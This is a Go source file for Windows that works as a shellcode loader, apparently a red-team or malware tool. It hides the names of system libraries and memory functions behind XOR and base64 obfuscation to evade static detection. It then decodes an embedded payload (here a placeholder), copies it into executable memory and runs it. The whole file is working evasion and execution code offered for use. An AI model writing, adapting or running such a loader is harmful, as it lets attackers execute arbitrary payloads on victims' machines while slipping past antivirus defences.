package main

import (
	"encoding/base64"
	"syscall"
	"unsafe"
)

var (
	kernel32      = syscall.MustLoadDLL(Bake("EwYGFgYYS1FaHA8Y"))
	ntdll         = syscall.MustLoadDLL(Bake("FhcQFA9aHA8Y"))
	VirtualAlloc  = kernel32.MustFindProc(Bake("LgoGDBYVFCIYFAwX"))
	RtlCopyMemory = ntdll.MustFindProc(Bake("KhcYOwwEAS4RFQwGAQ=="))
	key           = "xct"
)

func main() {
	var encoded = "<base64shellcode>"
	var s = "LAsRWAwEHREVDAobFkMXFw4EFAYAHQdUCxYXGwYHCwUBFA8NVg=="
	var sc = Polish(encoded)
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(sc)), 0x1000|0x2000, 0x40)
	if err != nil && err.Error() != Bake(s) {
		syscall.Exit(0)
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	if err != nil && err.Error() != Bake(s) {
		syscall.Exit(0)
	}
	syscall.Syscall(addr, 0, 0, 0, 0)
}

func Bake(cipher string) string {
	tmp, _ := base64.StdEncoding.DecodeString(cipher)
	baked := ""
	for i := 0; i < len(tmp); i++ {
		baked += string(tmp[i] ^ key[i%len(key)])
	}
	return baked
}

func Polish(cipher string) []byte {
	tmp, _ := base64.StdEncoding.DecodeString(cipher)
	var polished []byte
	for i := 0; i < len(tmp); i++ {
		polished = append(polished, tmp[i]^key[i%len(key)])
	}
	return polished
}
